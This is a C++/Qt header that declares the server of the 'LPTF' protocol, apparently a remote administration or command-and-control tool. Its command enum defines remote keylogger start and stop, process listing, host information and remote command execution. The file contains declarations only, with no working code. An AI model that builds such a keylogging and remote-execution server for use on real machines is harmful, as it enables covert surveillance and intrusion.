#ifndef LPTF_SERVER_HPP
#define LPTF_SERVER_HPP

#include "LPTF_Socket.h"
#include "LPTF_Packet.h"
#include "LPTF_Database.h"

#include <thread>
#include <string>
#include <vector>
#include <conio.h>
#include <iostream>
#include <iomanip>

#include <QObject>
#include <QString>
#include <QDebug>

enum class CommandType : uint8_t
{
    SEND_MESSAGE = 0x01,
    START_KEYLOGGER_REQUEST = 0x02,
    STOP_KEYLOGGER_REQUEST = 0x03,
    LIST_PROCESSES_REQUEST = 0x04,
    HOST_INFO_REQUEST = 0x05,
    EXECUTE_COMMAND_REQUEST = 0x06,
    HOST_INFO_RESPONSE = 0x81,
    KEY_LOG_DATA_RESPONSE = 0x82,
    LIST_PROCESSES_RESPONSE = 0x84,
    COMMAND_RESULT_RESPONSE = 0x85
};

/**
 * LPTF_Server
 * Handles the server-side operations for the LPTF protocol.
 * It manages socket communication, packet creation, and command handling.
 */
class LPTF_Server : public QObject
{
    Q_OBJECT

public:
    explicit LPTF_Server(const string &ip, int port, QObject *parent = nullptr);
    ~LPTF_Server();
    void run();
public slots:
    void sendSystemInfoRequest();
    void sendProcessListRequest();
signals:
    void clientCountChanged(int count);
    void systemInfoReceived(const QString &info);
    void processListReceived(const vector<vector<std::string>> &processes);

private:
    LPTF_Socket serverSocket;
    SOCKET clientSocket;
    std::vector<LPTF_Socket *> clientSockets;
    void handleClient(LPTF_Socket &clientSocket);
    void handleConnection();
    void sendPacketToClient(LPTF_Socket &clientSocket, const std::string &data, CommandType type);
    void handleAdminInput();
    void handleCommand(const LPTF_Packet &packet, LPTF_Socket &client);
    vector<vector<string>> deserializeStringTable(const vector<uint8_t> &payload);

    LPTF_Database db;
};
#endif // LPTF_SERVER_H